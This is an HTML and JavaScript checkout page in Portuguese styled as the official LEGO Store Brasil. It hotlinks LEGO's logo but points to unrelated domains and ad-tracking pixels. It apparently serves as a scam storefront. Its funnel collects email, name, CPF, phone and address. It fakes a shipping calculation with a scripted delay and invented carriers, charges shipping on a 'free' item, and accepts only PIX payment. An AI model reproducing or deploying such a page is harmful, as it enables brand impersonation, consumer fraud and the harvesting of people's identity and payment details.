<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Finalizar Compra - LEGO Store Brasil</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <!-- Adicionando scripts UTMify no head conforme layout React -->
    <script>
        window.pixelId = "689d6967a9b91cc128240c1f";
        var a = document.createElement("script");
        a.setAttribute("async", "");
        a.setAttribute("defer", "");
        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
        document.head.appendChild(a);
    </script>
    <script
        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
        async
        defer
    ></script>
    
    <style>
        body { 
            font-family: 'Inter', sans-serif; 
        }
        .animate-fade-in {
            animation: fadeIn 0.5s ease-in-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .loading-spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3b82f6;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: #dc2626;
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            z-index: 2000;
            opacity: 0;
            transition: all 0.3s ease;
            min-width: 280px;
            max-width: 85%;
            text-align: center;
            font-weight: 400;
            font-size: 14px;
            line-height: 1.4;
        }
        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }
        .toast.error { background: #ef4444; }
        .toast.success { background: #22c55e; }
        .toast.info { background: #3b82f6; }
        
        /* Adicionando estilos para seleção de frete com borda azul */
        .shipping-option {
            transition: all 0.3s ease;
            cursor: pointer;
        }
        .shipping-option:hover {
            background-color: #f9fafb;
        }
        .shipping-option.selected {
            border-color: #3b82f6 !important;
            background-color: #eff6ff;
        }
        .delivery-method-btn {
            transition: all 0.3s ease;
        }
        .delivery-method-btn.active {
            background-color: #3b82f6;
            color: white;
        }
        
        /* Adicionando estilos para as etapas do funil */
        .step-hidden {
            display: none;
        }
        .step-visible {
            display: block;
        }
        .edit-btn {
            color: #3b82f6;
            text-decoration: underline;
            cursor: pointer;
            font-size: 14px;
        }
        .edit-btn:hover {
            color: #1d4ed8;
        }
    </style>
    
    <script>
        const CONFIG = {
            API_BASE_URL: "https://monkeycheckout.online/vakinha-luky",
            FRONTEND_URL: "https://legostore.online"
        };
    </script>
</head>
<body class="bg-gray-50">
    <!-- Header idêntico ao CheckoutHeader React com banner azul e logo LEGO -->
    <div class="bg-blue-600 text-white text-center py-2 text-xs md:text-sm">
        <div class="flex items-center justify-center gap-2 px-2">
            <span class="text-center">A semana favorita de todo bruxo está quase chegando</span>
            <button class="underline hidden md:inline">Saiba mais</button>
        </div>
    </div>

    <header class="bg-yellow-400 border-b border-yellow-500">
        <div class="max-w-7xl mx-auto px-2 md:px-4">
            <div class="flex items-center justify-between h-14 md:h-16">
                <div class="flex items-center flex-row">
                    <img
                        src="https://legobrasil.vtexassets.com/assets/vtex/assets-builder/legobrasil.dup-template/1.28.0/logo___40c43ea8a6afef0f36be240072a0e00d.png"
                        alt="LEGO"
                        class="h-8 md:h-10 w-auto"
                    />
                </div>

                <div class="flex items-center gap-2 text-black">
                    <svg class="w-4 h-4 md:w-5 md:h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                    </svg>
                    <span class="font-semibold text-sm md:text-base">Checkout seguro</span>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <div class="min-h-screen bg-gray-50 animate-fade-in">
        <div class="max-w-md mx-auto bg-white min-h-screen">
            
            <!-- Etapa 1: Cart (Carrinho) -->
            <div id="step-cart" class="step-visible">
                <div class="p-4 border-b">
                    <h1 class="text-xl font-semibold text-gray-900 text-center">Meu Carrinho</h1>
                </div>

                <div class="p-4">
                    <!-- Produto carregado do localStorage -->
                    <div id="cartProduct" class="mb-6">
                        <!-- Will be populated dynamically -->
                    </div>

                    <!-- Seção de entrega seguindo fluxo React exato -->
                    <div class="mb-6">
                        <h2 class="text-lg font-medium text-gray-900 mb-2">Entrega</h2>
                        <p class="text-sm text-gray-600 mb-4">Veja as opções de entrega para seus itens, com todos os prazos e valores.</p>
                        
                        <!-- Botão Calcular que inicia o fluxo -->
                        <div id="calculateSection">
                            <button id="calculateBtn" class="w-full bg-blue-600 text-white py-3 rounded-lg font-semibold hover:bg-blue-700 transition-colors">
                                Calcular
                            </button>
                        </div>

                        <!-- Opções de entrega que aparecem após clicar em Calcular -->
                        <div id="deliveryOptionsSection" class="hidden mt-4">
                            <div class="flex bg-gray-100 rounded-full p-1 mb-4">
                                <button id="receberBtn" class="delivery-method-btn flex-1 py-2 px-4 rounded-full text-sm font-medium active">
                                    Receber
                                </button>
                                <button id="retirarBtn" class="delivery-method-btn flex-1 py-2 px-4 rounded-full text-sm font-medium text-gray-600">
                                    Retirar
                                </button>
                            </div>

                            <!-- Campo CEP que aparece após selecionar método de entrega -->
                            <div id="cepSection" class="mb-4">
                                <label class="block text-sm font-medium text-gray-700 mb-2">CEP</label>
                                <div class="flex gap-2 mb-2">
                                    <input
                                        type="text"
                                        id="cepInput"
                                        placeholder="00000-000"
                                        maxlength="9"
                                        class="flex-1 px-3 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                                    />
                                    <button id="calculateFreightBtn" class="px-4 py-2 text-blue-600 border border-blue-600 rounded-md hover:bg-blue-50 bg-transparent">
                                        <span id="calculateFreightText">Calcular</span>
                                        <div id="freightSpinner" class="hidden w-4 h-4 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
                                    </button>
                                </div>
                                <div id="cepError" class="hidden text-sm text-red-500"></div>
                            </div>

                            <!-- Opções de frete que aparecem após calcular CEP -->
                            <div id="shippingOptionsSection" class="hidden mb-6">
                                <h3 class="text-sm font-medium text-gray-700 mb-3">Forma de entrega</h3>
                                <div id="shippingOptionsList" class="space-y-2">
                                    <!-- Will be populated dynamically -->
                                </div>
                                <button id="continueToEmailBtn" class="w-full bg-blue-600 text-white py-3 rounded-lg font-semibold hover:bg-blue-700 transition-colors mt-4 hidden">
                                    Continuar
                                </button>
                            </div>
                        </div>
                    </div>

                    <!-- Botões de cupom e código de vendedor -->
                    <div class="space-y-3 mb-6">
                        <button class="w-full bg-gray-400 text-white py-3 rounded-lg font-medium">
                            Adicionar Código de vendedor
                        </button>
                        <button class="w-full bg-gray-400 text-white py-3 rounded-lg font-medium">
                            Adicionar cupom de desconto
                        </button>
                    </div>

                    <!-- Resumo do pedido -->
                    <div class="border-t pt-4 mb-6">
                        <div class="flex justify-between items-center mb-2">
                            <span class="text-gray-600">Subtotal</span>
                            <span id="subtotal">R$ 0,00</span>
                        </div>
                        <div class="flex justify-between items-center text-lg font-semibold">
                            <span>Total</span>
                            <span id="total">R$ 0,00</span>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Etapa 2: Email -->
            <div id="step-email" class="step-hidden">
                <div class="p-4 border-b">
                    <h1 class="text-xl font-semibold text-gray-900 text-center">Seu E-mail</h1>
                </div>
                <div class="p-4">
                    <div class="mb-6">
                        <label class="block text-sm font-medium text-gray-700 mb-2">E-mail</label>
                        <input
                            type="email"
                            id="emailInput"
                            placeholder="seu@email.com"
                            class="w-full px-3 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                        />
                        <div id="emailError" class="hidden text-sm text-red-500 mt-1"></div>
                    </div>
                    <button id="continueToPersonalBtn" class="w-full bg-blue-600 text-white py-3 rounded-lg font-semibold hover:bg-blue-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed" disabled>
                        Continuar
                    </button>
                </div>
            </div>

            <!-- Etapa 3: Personal (Dados Pessoais) -->
            <div id="step-personal" class="step-hidden">
                <div class="p-4 border-b">
                    <h1 class="text-xl font-semibold text-gray-900 text-center">Seus Dados</h1>
                </div>
                <div class="p-4">
                    <div class="space-y-4 mb-6">
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-2">E-mail</label>
                            <input
                                type="email"
                                id="emailDisplay"
                                readonly
                                class="w-full px-3 py-3 border border-gray-300 rounded-md bg-gray-50"
                            />
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-2">Nome</label>
                            <input
                                type="text"
                                id="firstNameInput"
                                placeholder="Seu nome"
                                class="w-full px-3 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            />
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-2">Sobrenome</label>
                            <input
                                type="text"
                                id="lastNameInput"
                                placeholder="Seu sobrenome"
                                class="w-full px-3 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            />
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-2">CPF</label>
                            <input
                                type="text"
                                id="cpfInput"
                                placeholder="000.000.000-00"
                                maxlength="14"
                                class="w-full px-3 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            />
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-2">Telefone</label>
                            <input
                                type="text"
                                id="phoneInput"
                                placeholder="(00) 00000-0000"
                                maxlength="15"
                                class="w-full px-3 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                            />
                        </div>
                    </div>
                    <button id="continueToAddressBtn" class="w-full bg-blue-600 text-white py-3 rounded-lg font-semibold hover:bg-blue-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed" disabled>
                        Continuar
                    </button>
                </div>
            </div>

            <!-- Etapa 4: Address (já existente, mantendo a mesma) -->
            <div id="step-address" class="step-hidden">
                <div class="p-4 border-b">
                    <h1 class="text-xl font-semibold text-gray-900 text-center">Endereço de Entrega</h1>
                </div>
                <div class="p-4">
                    <!-- Resumo das etapas anteriores -->
                    <div class="mb-6 space-y-3">
                        <div class="flex justify-between items-center p-3 bg-gray-50 rounded-lg">
                            <div>
                                <p class="text-sm font-medium">E-mail</p>
                                <p class="text-sm text-gray-600" id="summaryEmail">-</p>
                            </div>
                            <button class="edit-btn" onclick="goToStep('email')">Editar</button>
                        </div>
                        <div class="flex justify-between items-center p-3 bg-gray-50 rounded-lg">
                            <div>
                                <p class="text-sm font-medium">Dados Pessoais</p>
                                <p class="text-sm text-gray-600" id="summaryPersonal">-</p>
                            </div>
                            <button class="edit-btn" onclick="goToStep('personal')">Editar</button>
                        </div>
                    </div>

                    <!-- Endereço baseado no CEP já preenchido -->
                    <div class="mb-6">
                        <h2 class="text-lg font-medium text-gray-900 mb-4">Confirme seu endereço</h2>
                        <div id="addressDisplay" class="p-3 border rounded-lg bg-gray-50">
                            <!-- Will be populated from previous step -->
                        </div>
                    </div>

                    <button id="continueToPaymentBtn" class="w-full bg-blue-600 text-white py-3 rounded-lg font-semibold hover:bg-blue-700 transition-colors">
                        Continuar para Pagamento
                    </button>
                </div>
            </div>

            <!-- Etapa 5: Payment (Pagamento) -->
            <div id="step-payment" class="step-hidden">
                <div class="p-4 border-b">
                    <h1 class="text-xl font-semibold text-gray-900 text-center">Pagamento</h1>
                </div>
                <div class="p-4">
                    <!-- Resumo completo -->
                    <div class="mb-6 space-y-3">
                        <div class="flex justify-between items-center p-3 bg-gray-50 rounded-lg">
                            <div>
                                <p class="text-sm font-medium">E-mail</p>
                                <p class="text-sm text-gray-600" id="paymentSummaryEmail">-</p>
                            </div>
                            <button class="edit-btn" onclick="goToStep('email')">Editar</button>
                        </div>
                        <div class="flex justify-between items-center p-3 bg-gray-50 rounded-lg">
                            <div>
                                <p class="text-sm font-medium">Dados Pessoais</p>
                                <p class="text-sm text-gray-600" id="paymentSummaryPersonal">-</p>
                            </div>
                            <button class="edit-btn" onclick="goToStep('personal')">Editar</button>
                        </div>
                        <div class="flex justify-between items-center p-3 bg-gray-50 rounded-lg">
                            <div>
                                <p class="text-sm font-medium">Entrega</p>
                                <p class="text-sm text-gray-600" id="paymentSummaryShipping">-</p>
                            </div>
                            <button class="edit-btn" onclick="goToStep('cart')">Editar</button>
                        </div>
                    </div>

                    <!-- Método de pagamento -->
                    <div class="mb-6">
                        <h2 class="text-lg font-medium text-gray-900 mb-4">Método de Pagamento</h2>
                        <div class="p-4 border-2 border-blue-500 rounded-lg bg-blue-50">
                            <div class="flex items-center gap-3">
                                <input type="radio" name="payment" checked class="w-4 h-4 text-blue-600" />
                                <div>
                                    <p class="font-medium">PIX</p>
                                    <p class="text-sm text-gray-600">Pagamento instantâneo</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Total final -->
                    <div class="border-t pt-4 mb-6">
                        <div class="flex justify-between items-center text-lg font-semibold">
                            <span>Total</span>
                            <span id="finalTotal">R$ 0,00</span>
                        </div>
                    </div>

                    <button id="finishOrderBtn" class="w-full bg-orange-500 text-white py-3 rounded-lg font-semibold hover:bg-orange-600 transition-colors">
                        Finalizar Compra
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentStep = 'cart';
        let selectedDeliveryMethod = 'RECEBER';
        let selectedShipping = null;
        let cartData = null;
        let addressData = null;
        let formData = {
            email: '',
            firstName: '',
            lastName: '',
            cpf: '',
            phone: ''
        };

        function goToStep(step) {
            // Esconder todas as etapas
            document.querySelectorAll('[id^="step-"]').forEach(el => {
                el.classList.remove('step-visible');
                el.classList.add('step-hidden');
            });

            // Mostrar etapa atual
            document.getElementById(`step-${step}`).classList.remove('step-hidden');
            document.getElementById(`step-${step}`).classList.add('step-visible');
            
            currentStep = step;

            // Atualizar dados nas etapas
            if (step === 'personal') {
                document.getElementById('emailDisplay').value = formData.email;
            }
            if (step === 'address') {
                updateAddressSummary();
            }
            if (step === 'payment') {
                updatePaymentSummary();
            }
        }

        function formatCEP(value) {
            return value
                .replace(/\D/g, '')
                .replace(/(\d{5})(\d)/, '$1-$2')
                .replace(/(-\d{3})\d+?$/, '$1');
        }

        function formatCPF(value) {
            return value
                .replace(/\D/g, '')
                .replace(/(\d{3})(\d)/, '$1.$2')
                .replace(/(\d{3})(\d)/, '$1.$2')
                .replace(/(\d{3})(\d{1,2})/, '$1-$2')
                .replace(/(-\d{2})\d+?$/, '$1');
        }

        function formatPhone(value) {
            return value
                .replace(/\D/g, '')
                .replace(/(\d{2})(\d)/, '($1) $2')
                .replace(/(\d{5})(\d)/, '$1-$2')
                .replace(/(-\d{4})\d+?$/, '$1');
        }

        function loadCartFromLocalStorage() {
            const checkoutData = localStorage.getItem("checkoutProduct");
            if (checkoutData) {
                cartData = JSON.parse(checkoutData);
                displayCartProduct();
                updateTotals();
            }
        }

        function displayCartProduct() {
            if (!cartData) return;

            const cartProductDiv = document.getElementById('cartProduct');
            const originalPrice = cartData.originalPrice || cartData.price;
            const finalPrice = cartData.finalPrice || cartData.price;
            const hasDiscount = originalPrice !== finalPrice;

            cartProductDiv.innerHTML = `
                <div class="flex items-center gap-3 p-3 border rounded-lg">
                    <img src="${cartData.image || '/placeholder.svg?height=60&width=60'}" alt="${cartData.name}" class="w-15 h-15 object-cover rounded">
                    <div class="flex-1">
                        <h3 class="font-medium text-sm">${cartData.name}</h3>
                        <div class="flex items-center gap-2 mt-1">
                            ${hasDiscount ? `<span class="text-xs text-gray-500 line-through">R$ ${originalPrice.toFixed(2).replace('.', ',')}</span>` : ''}
                            <span class="font-semibold text-sm">R$ ${finalPrice.toFixed(2).replace('.', ',')}</span>
                        </div>
                    </div>
                </div>
            `;
        }

        function updateTotals() {
            if (!cartData) return;

            const subtotal = cartData.finalPrice || cartData.price;
            const shippingCost = selectedShipping ? selectedShipping.price : 0;
            const total = subtotal + shippingCost;

            document.getElementById('subtotal').textContent = `R$ ${subtotal.toFixed(2).replace('.', ',')}`;
            document.getElementById('total').textContent = `R$ ${total.toFixed(2).replace('.', ',')}`;
            document.getElementById('finalTotal').textContent = `R$ ${total.toFixed(2).replace('.', ',')}`;
        }

        function updateAddressSummary() {
            document.getElementById('summaryEmail').textContent = formData.email;
            document.getElementById('summaryPersonal').textContent = `${formData.firstName} ${formData.lastName}`;
            
            if (addressData) {
                document.getElementById('addressDisplay').innerHTML = `
                    <p class="font-medium">${addressData.fullAddress}</p>
                    <p class="text-sm text-gray-600 mt-1">CEP: ${document.getElementById('cepInput').value}</p>
                `;
            }
        }

        function updatePaymentSummary() {
            document.getElementById('paymentSummaryEmail').textContent = formData.email;
            document.getElementById('paymentSummaryPersonal').textContent = `${formData.firstName} ${formData.lastName}`;
            document.getElementById('paymentSummaryShipping').textContent = selectedShipping ? 
                `${selectedShipping.type} - ${selectedShipping.price === 0 ? 'Grátis' : `R$ ${selectedShipping.price.toFixed(2).replace('.', ',')}`}` : 
                'Não selecionado';
        }

        async function getAddressFromCep(cep) {
            try {
                const cepNumbers = cep.replace(/\D/g, '');
                const response = await fetch(`https://viacep.com.br/ws/${cepNumbers}/json/`);
                const data = await response.json();

                if (data.erro) {
                    throw new Error("CEP não encontrado");
                }

                return {
                    street: data.logradouro,
                    district: data.bairro,
                    city: data.localidade,
                    state: data.uf,
                    fullAddress: `${data.logradouro}, ${data.bairro} - ${data.localidade} - ${data.uf}`,
                };
            } catch (error) {
                console.error("Erro ao buscar CEP:", error);
                return null;
            }
        }

        async function calculateShipping() {
            const cepInput = document.getElementById('cepInput');
            const cepError = document.getElementById('cepError');
            const calculateFreightBtn = document.getElementById('calculateFreightBtn');
            const calculateFreightText = document.getElementById('calculateFreightText');
            const freightSpinner = document.getElementById('freightSpinner');

            const cep = cepInput.value.trim();
            if (!cep) {
                showCepError("Campo obrigatório.");
                return;
            }

            hideCepError();
            
            // Mostrar loading
            calculateFreightText.style.display = 'none';
            freightSpinner.classList.remove('hidden');
            calculateFreightBtn.disabled = true;

            // Buscar endereço
            addressData = await getAddressFromCep(cep);
            
            // Simular delay da API
            await new Promise(resolve => setTimeout(resolve, 2000));

            // Esconder loading
            calculateFreightText.style.display = 'inline';
            freightSpinner.classList.add('hidden');
            calculateFreightBtn.disabled = false;

            // Gerar opções de frete
            const shippingOptions = generateShippingOptions();
            displayShippingOptions(shippingOptions);
        }

        function generateShippingOptions() {
            const isFreeItem = cartData && cartData.isFree;
            
            if (selectedDeliveryMethod === "RETIRAR") {
                const bairro = addressData?.district || "Centro";
                return [{
                    type: "Centro de Distribuição LEGO",
                    distance: "3.1km",
                    address: `📍 ${bairro}`,
                    price: 0,
                    days: ""
                }];
            } else {
                if (isFreeItem) {
                    return [{
                        type: "Correios Pac",
                        price: 25.91,
                        days: "de 5-7 dias úteis"
                    }];
                } else {
                    return [
                        {
                            type: "Correios Pac",
                            price: 0,
                            days: "de 5-7 dias úteis."
                        },
                        {
                            type: "JadLog Transportadora",
                            price: 25.91,
                            days: "Chegará amanhã."
                        }
                    ];
                }
            }
        }

        function displayShippingOptions(options) {
            const shippingOptionsSection = document.getElementById('shippingOptionsSection');
            const shippingOptionsList = document.getElementById('shippingOptionsList');

            shippingOptionsList.innerHTML = '';

            options.forEach((option, index) => {
                const optionDiv = document.createElement('div');
                optionDiv.className = 'shipping-option flex items-center gap-3 p-3 border rounded-lg';
                optionDiv.dataset.index = index;

                optionDiv.innerHTML = `
                    <input type="radio" name="shipping" class="w-4 h-4 text-blue-600" />
                    <div class="flex-1">
                        <p class="font-medium text-sm">${option.type}</p>
                        <p class="text-xs text-gray-600">${option.days || option.distance}</p>
                        ${option.address ? `<p class="text-xs text-gray-600">${option.address}</p>` : ''}
                    </div>
                    <p class="font-semibold text-sm">
                        ${option.price === 0 ? "Grátis" : `R$ ${option.price.toFixed(2).replace(".", ",")}`}
                    </p>
                `;

                optionDiv.addEventListener('click', () => selectShippingOption(option, optionDiv));
                shippingOptionsList.appendChild(optionDiv);
            });

            shippingOptionsSection.classList.remove('hidden');
        }

        function selectShippingOption(option, element) {
            // Remover seleção anterior
            document.querySelectorAll('.shipping-option').forEach(el => {
                el.classList.remove('selected');
                el.querySelector('input[type="radio"]').checked = false;
            });

            // Adicionar seleção atual
            element.classList.add('selected');
            element.querySelector('input[type="radio"]').checked = true;
            
            selectedShipping = option;
            updateTotals();
            
            document.getElementById('continueToEmailBtn').classList.remove('hidden');
        }

        function showCepError(message) {
            const cepError = document.getElementById('cepError');
            const cepInput = document.getElementById('cepInput');
            
            cepError.textContent = message;
            cepError.classList.remove('hidden');
            cepInput.classList.add('border-red-500');
        }

        function hideCepError() {
            const cepError = document.getElementById('cepError');
            const cepInput = document.getElementById('cepInput');
            
            cepError.classList.add('hidden');
            cepInput.classList.remove('border-red-500');
        }

        function validateEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }

        function validatePersonalForm() {
            const firstName = document.getElementById('firstNameInput').value.trim();
            const lastName = document.getElementById('lastNameInput').value.trim();
            const cpf = document.getElementById('cpfInput').value.trim();
            const phone = document.getElementById('phoneInput').value.trim();

            return firstName && lastName && cpf.length >= 14 && phone.length >= 14;
        }

        document.addEventListener('DOMContentLoaded', function() {
            // Carregar produto do localStorage
            loadCartFromLocalStorage();

            
            // Etapa 1: Cart
            document.getElementById('calculateBtn').addEventListener('click', function() {
                document.getElementById('calculateSection').style.display = 'none';
                document.getElementById('deliveryOptionsSection').classList.remove('hidden');
            });

            document.getElementById('continueToEmailBtn').addEventListener('click', function() {
                goToStep('email');
            });

            // Etapa 2: Email
            const emailInput = document.getElementById('emailInput');
            const continueToPersonalBtn = document.getElementById('continueToPersonalBtn');

            emailInput.addEventListener('input', function() {
                const email = this.value.trim();
                const isValid = validateEmail(email);
                
                continueToPersonalBtn.disabled = !isValid;
                
                if (email && !isValid) {
                    document.getElementById('emailError').textContent = 'E-mail inválido';
                    document.getElementById('emailError').classList.remove('hidden');
                } else {
                    document.getElementById('emailError').classList.add('hidden');
                }
            });

            continueToPersonalBtn.addEventListener('click', function() {
                formData.email = emailInput.value.trim();
                goToStep('personal');
            });

            // Etapa 3: Personal
            const personalInputs = ['firstNameInput', 'lastNameInput', 'cpfInput', 'phoneInput'];
            const continueToAddressBtn = document.getElementById('continueToAddressBtn');

            personalInputs.forEach(inputId => {
                const input = document.getElementById(inputId);
                
                if (inputId === 'cpfInput') {
                    input.addEventListener('input', function(e) {
                        e.target.value = formatCPF(e.target.value);
                        continueToAddressBtn.disabled = !validatePersonalForm();
                    });
                } else if (inputId === 'phoneInput') {
                    input.addEventListener('input', function(e) {
                        e.target.value = formatPhone(e.target.value);
                        continueToAddressBtn.disabled = !validatePersonalForm();
                    });
                } else {
                    input.addEventListener('input', function() {
                        continueToAddressBtn.disabled = !validatePersonalForm();
                    });
                }
            });

            continueToAddressBtn.addEventListener('click', function() {
                formData.firstName = document.getElementById('firstNameInput').value.trim();
                formData.lastName = document.getElementById('lastNameInput').value.trim();
                formData.cpf = document.getElementById('cpfInput').value.trim();
                formData.phone = document.getElementById('phoneInput').value.trim();
                goToStep('address');
            });

            // Etapa 4: Address
            document.getElementById('continueToPaymentBtn').addEventListener('click', function() {
                goToStep('payment');
            });

            // Etapa 5: Payment
            document.getElementById('finishOrderBtn').addEventListener('click', function() {
                alert('Redirecionando para PIX...');
                // Aqui você pode redirecionar para a página do PIX
            });


            // Botões de método de entrega
            document.getElementById('receberBtn').addEventListener('click', function() {
                selectedDeliveryMethod = 'RECEBER';
                updateDeliveryMethodButtons();
                resetShippingOptions();
            });

            document.getElementById('retirarBtn').addEventListener('click', function() {
                selectedDeliveryMethod = 'RETIRAR';
                updateDeliveryMethodButtons();
                resetShippingOptions();
            });

            // Campo CEP com formatação
            document.getElementById('cepInput').addEventListener('input', function(e) {
                e.target.value = formatCEP(e.target.value);
                hideCepError();
            });

            // Botão calcular frete
            document.getElementById('calculateFreightBtn').addEventListener('click', calculateShipping);
        });

        function updateDeliveryMethodButtons() {
            const receberBtn = document.getElementById('receberBtn');
            const retirarBtn = document.getElementById('retirarBtn');

            receberBtn.classList.remove('active');
            retirarBtn.classList.remove('active');

            if (selectedDeliveryMethod === 'RECEBER') {
                receberBtn.classList.add('active');
            } else {
                retirarBtn.classList.add('active');
            }
        }

        function resetShippingOptions() {
            document.getElementById('shippingOptionsSection').classList.add('hidden');
            document.getElementById('continueToEmailBtn').classList.add('hidden');
            selectedShipping = null;
            updateTotals();
        }
    </script>
</body>
</html>
